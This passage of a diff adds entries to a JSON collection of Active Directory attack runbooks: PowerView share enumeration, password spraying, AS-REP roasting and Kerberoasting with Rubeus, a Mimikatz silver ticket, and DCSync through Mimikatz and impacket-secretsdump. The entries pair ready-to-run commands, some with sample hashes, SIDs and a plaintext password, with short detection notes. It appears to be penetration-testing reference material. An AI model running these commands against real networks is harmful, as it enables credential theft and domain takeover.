+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#PowerView</span> and related share-discovery helpers such as <code>Invoke-ShareFinder</code> or <code>Find-DomainShare</code> can map remote SMB shares across a domain and optionally test whether the current user can read them. This turns broad endpoint discovery into a concrete map of reachable UNC paths, helping the attacker identify locations where policy backups, scripts, documents, or legacy secrets can be collected immediately. The runbook also demonstrates reading discovered share content such as old GPP-related files from <code>SYSVOL</code>.</p>\n<ol><li><strong>How attack works:</strong> The attacker enumerates domain computers and sweeps them for readable shares.</li><li><strong>How attack works:</strong> The current credential context is tested against remote SMB shares and only accessible paths are returned.</li><li><strong>How attack works:</strong> Interesting share content is browsed and can reveal follow-on secrets such as old GPP data.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> PowerView is part of the <a href=\"https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView\">PowerSploit framework</a>.</li><li><strong>Attack pre-requesite:</strong> A PowerShell session with network reachability to remote SMB endpoints and credentials that can read one or more shares.</li><li><strong>What attacker gains:</strong> A map of accessible UNC paths and potentially direct access to valuable data stored on those shares.</li><li><strong>Detection/Defense opsec:</strong> Monitor broad share-enumeration sweeps, restrict unnecessary share exposure, and investigate large-scale UNC path probing from user workstations.</li></ul>",
+    "tags": [
+      "platform:windows",
+      "shell:cmd",
+      "tool:powerview",
+      "phase:recon",
+      "domain:ad"
+    ],
+    "color": "#3b82f6",
+    "hasGraph": true
+  },
+  {
+    "id": "2baf94b7-aa9e-4c19-8b94-d5bc66975d1b",
+    "label": "Password Spraying (PowerShell)",
+    "command": "# very first step, identify password lockout thresholds:\n\nPS > net accounts \n\n# then \n\nPS > powershell -ep bypass\n\nPS > .\\Spray-Passwords.ps1 -Pass Nexus123! -Admin\n\n",
+    "description": "<p>Password spraying attacks many accounts with a single likely password rather than hammering one account repeatedly. This runbook starts by checking lockout policy, then runs a PowerShell spraying script with a chosen password candidate across many domain users. When executed carefully, spraying can reveal weak credentials while reducing the chance of triggering account lockouts compared with traditional brute-force attacks.</p>\n<ol><li><strong>How attack works:</strong> The attacker reviews lockout policy to understand the safe spray threshold.</li><li><strong>How attack works:</strong> A single password candidate is tested horizontally across many domain accounts.</li><li><strong>How attack works:</strong> Any successful authentications reveal valid AD credentials for later access.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> The workflow uses native PowerShell plus a password-spraying script such as <code>Spray-Passwords.ps1</code>.</li><li><strong>Attack pre-requesite:</strong> A candidate password, a reachable Domain Controller or auth path, and enough knowledge of lockout policy to avoid mass account disruption.</li><li><strong>What attacker gains:</strong> Valid domain credentials for accounts that reuse weak or predictable passwords.</li><li><strong>Detection/Defense opsec:</strong> Monitor distributed failed logons against many accounts, enforce MFA and strong password policy, and alert on horizontal authentication patterns from a single host.</li></ul>",
+    "tags": [
+      "phase:exploit",
+      "platform:windows",
+      "shell:powershell",
+      "domain:ad"
+    ],
+    "color": "#ef4444",
+    "hasGraph": true
+  },
+  {
+    "id": "fbd3240b-227a-4353-a0c1-8da0cfe6d8e1",
+    "label": "AS-REP Roasting (Rubeus)",
+    "command": " .\\Rubeus.exe asreproast /nowrap\n\n",
+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#Rubeus</span> can perform AS-REP Roasting directly from a compromised Windows host by enumerating users with preauthentication disabled and requesting roastable Kerberos material in memory. Unlike the Impacket variant, this runbook does not need a separate user list in the command shown; Rubeus can automate the discovery and retrieval flow from the current domain context. The resulting hashes can then be cracked offline to recover plaintext passwords for misconfigured accounts.</p>\n<ol><li><strong>How attack works:</strong> The attacker loads or executes <span style=\"color:#ef4444;font-weight:bold;\">#Rubeus</span> from the compromised Windows endpoint.</li><li><strong>How attack works:</strong> Rubeus queries the domain and requests roastable AS-REP material for accounts with preauthentication disabled.</li><li><strong>How attack works:</strong> The returned hashes are exported for later cracking or credential abuse.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Rubeus</span> is available from the <a href=\"https://github.com/GhostPack/Rubeus\">GhostPack Rubeus project</a>.</li><li><strong>Attack pre-requesite:</strong> A domain-aware Windows foothold and one or more users with Kerberos preauthentication disabled.</li><li><strong>What attacker gains:</strong> Crackable AS-REP hashes for vulnerable accounts without needing the target passwords in advance.</li><li><strong>Detection/Defense opsec:</strong> Disable preauth exceptions, monitor unusual AS-REQ behavior from workstations, and inspect in-memory .NET tooling or execute-assembly workflows that invoke Rubeus.</li></ul>",
+    "tags": [
+      "phase:exploit",
+      "platform:windows",
+      "shell:cmd",
+      "domain:ad",
+      "tool:rubeus"
+    ],
+    "color": "#ef4444",
+    "hasGraph": true
+  },
+  {
+    "id": "051a8f68-6826-428b-8d59-49c4e42f4ac6",
+    "label": "Kerberoasting (Rubeus)",
+    "command": ".\\Rubeus.exe kerberoast /outfile:hashes.kerberoast",
+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#Rubeus</span> can perform Kerberoasting directly from a compromised Windows host by enumerating SPN-bearing accounts and requesting service tickets that are crackable offline. Because the ticket material is returned in a format that can be saved to disk or piped elsewhere, the operator can combine on-host enumeration with later offline cracking. This is a common Windows-native alternative to Impacket-based Kerberoasting when the attacker already has a domain foothold on a Windows endpoint.</p>\n<ol><li><strong>How attack works:</strong> The attacker executes Rubeus from the compromised endpoint.</li><li><strong>How attack works:</strong> Rubeus identifies SPN-bearing accounts and requests Kerberos service tickets for them.</li><li><strong>How attack works:</strong> The resulting Kerberoast hashes are exported for later cracking.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Rubeus</span> is available from the <a href=\"https://github.com/GhostPack/Rubeus\">GhostPack Rubeus project</a>.</li><li><strong>Attack pre-requesite:</strong> A Windows foothold in the target domain and the ability to request service tickets from the KDC.</li><li><strong>What attacker gains:</strong> Crackable service-ticket material for SPN-bearing accounts, often tied to service identities with elevated access.</li><li><strong>Detection/Defense opsec:</strong> Monitor spikes in TGS requests, use strong service-account passwords or gMSAs, and watch for in-memory Rubeus execution on endpoints.</li></ul>",
+    "tags": [
+      "phase:exploit",
+      "platform:windows",
+      "shell:cmd",
+      "domain:ad",
+      "tool:rubeus"
+    ],
+    "color": "#ef4444",
+    "hasGraph": true
+  },
+  {
+    "id": "2d9dda54-d118-4dc7-9293-68063f1fda1a",
+    "label": "Silver Ticket (Mimikatz)",
+    "command": "# check first if current user has permission to service using PS iwr utility\n\nPS > iwr -UseDefaultCredentials http://web04\n\n# if no, fire mimikatz and dump the NTLM Hash of the service (imagine its hard) : \n\nmimikatz# privilege::debug\nmimikatz# sekurlsa::logonpasswords\n\n# get also  user Domain SID\n\nwhoami /user\n\n# SPN you know it already for service.. then time to generate the TGS\n\nmimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin\n\n# exit mimikatz, and check list\nklist\n\n# now check you have access :\n\nPS > iwr -UseDefaultCredentials http://web04\n",
+    "description": "<p>A Silver Ticket attack forges a service ticket (TGS) for a specific service rather than a TGT for the entire domain. With <span style=\"color:#ef4444;font-weight:bold;\">#Mimikatz</span>, the attacker uses the target service account's secret, the domain SID, and the service SPN to create a ticket that the service will trust directly. Unlike a Golden Ticket, the KDC can be bypassed once the forged service ticket is injected, which makes Silver Tickets useful for targeted persistence or service-specific lateral movement when the service account secret is known.</p>\n<ol><li><strong>How attack works:</strong> The attacker gathers the service account hash, domain SID, and target SPN.</li><li><strong>How attack works:</strong> Mimikatz forges a service-specific Kerberos ticket offline and injects it into the session.</li><li><strong>How attack works:</strong> The forged ticket is used directly against the target service for privileged access.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Mimikatz</span> is available from the <a href=\"https://github.com/gentilkiwi/mimikatz\">Mimikatz project</a>.</li><li><strong>Attack pre-requesite:</strong> Knowledge of the target SPN, the relevant service account or computer-account secret, and the domain SID.</li><li><strong>What attacker gains:</strong> Service-specific Kerberos access that can bypass normal KDC-mediated validation for that target service.</li><li><strong>Detection/Defense opsec:</strong> Monitor unusual Kerberos service-ticket behavior, protect service account secrets, and investigate access that appears valid to a service but lacks a normal KDC-driven history.</li></ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "phase:exploit",
+      "tool:mimikatz",
+      "domain:ad"
+    ],
+    "color": "#ef4444",
+    "hasGraph": true
+  },
+  {
+    "id": "46f6c18c-ea9d-4260-b8b6-07f679d104aa",
+    "label": "DCSync (Mimikatz)",
+    "command": "\nmimikaz # lsadump::dcsync /user:corp\\dave\n\nhashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r\n/usr/share/hashcat/rules/best64.rule --force",
+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#Mimikatz</span> can perform DCSync by invoking the domain replication interfaces to request password data for a chosen account, such as <code>krbtgt</code> or another privileged principal. Instead of extracting <code>NTDS.dit</code> from disk, the attacker impersonates a legitimate replication partner and asks the Domain Controller to replicate credential material over the network. This makes DCSync one of the highest-impact credential-access techniques in Active Directory when the attacker has the necessary replication rights.</p>\n<ol><li><strong>How attack works:</strong> The attacker runs <code>lsadump::dcsync</code> from Mimikatz with a target user.</li><li><strong>How attack works:</strong> The Domain Controller returns replicated credential material for that user.</li><li><strong>How attack works:</strong> The resulting hash or key material is reused for follow-on attacks such as ticket forgery or pass-the-hash.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Mimikatz</span> provides <code>lsadump::dcsync</code> for replication abuse.</li><li><strong>Attack pre-requesite:</strong> Rights such as <strong>Replicating Directory Changes</strong> and related permissions, plus network reachability to the Domain Controller.</li><li><strong>What attacker gains:</strong> NTLM and key material for selected domain accounts without touching the database files directly.</li><li><strong>Detection/Defense opsec:</strong> Audit replication rights, monitor DRSUAPI activity from non-DC systems, and alert on DCSync behavior targeting high-value accounts.</li></ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "phase:exploit",
+      "tool:mimikatz",
+      "domain:ad"
+    ],
+    "color": "#ef4444",
+    "hasGraph": true
+  },
+  {
+    "id": "2bc3ddd9-1406-4eb1-a845-a02c83b71081",
+    "label": "DCSync (secretsdump)",
+    "command": "impacket-secretsdump -just-dc-user dave\ncorp.com/jeffadmin:\"BrouhahaTungPerorateBroom2023\\!\"@192.168.50.70",
+    "description": "<p><span style=\"color:#ef4444;font-weight:bold;\">#Impacket</span>'s <code>secretsdump</code> can perform DCSync remotely from a Linux attacker system by binding to the same directory replication interfaces used by Domain Controllers. Instead of running Windows tooling on a compromised host, the attacker uses valid domain credentials with replication rights and asks the Domain Controller to return account credential material over the network. This makes <code>secretsdump</code> a flexible remote option for high-impact AD credential theft.</p>\n<ol><li><strong>How attack works:</strong> The attacker launches <code>impacket-secretsdump</code> with replication-capable credentials.</li><li><strong>How attack works:</strong> The tool binds to the replication interface and requests the targeted account's credential material.</li><li><strong>How attack works:</strong> Returned hashes or keys are saved for follow-on abuse such as pass-the-hash or ticket forgery.</li></ol>\n<ul><li><strong>Tool Location/Source:</strong> <span style=\"color:#ef4444;font-weight:bold;\">#Impacket</span> provides <code>secretsdump</code> for remote DCSync-style operations.</li><li><strong>Attack pre-requesite:</strong> Credentials with replication rights and reachability to the Domain Controller over the required SMB/RPC/DCERPC paths.</li><li><strong>What attacker gains:</strong> Domain hashes or key material for selected users without needing on-host database access.</li><li><strong>Detection/Defense opsec:</strong> Alert on replication behavior from non-DC hosts, audit replication-right assignments, and monitor remote secretsdump-like DCSync activity.</li></ul>",
+    "tags": [
+      "shell:cmd",
+      "platform:windows",
+      "phase:exploit",
+      "tool:impacket",
+      "domain:ad"
+    ],
+    "color": "#ef4444",
+    "hasGraph": true
+  }
+]
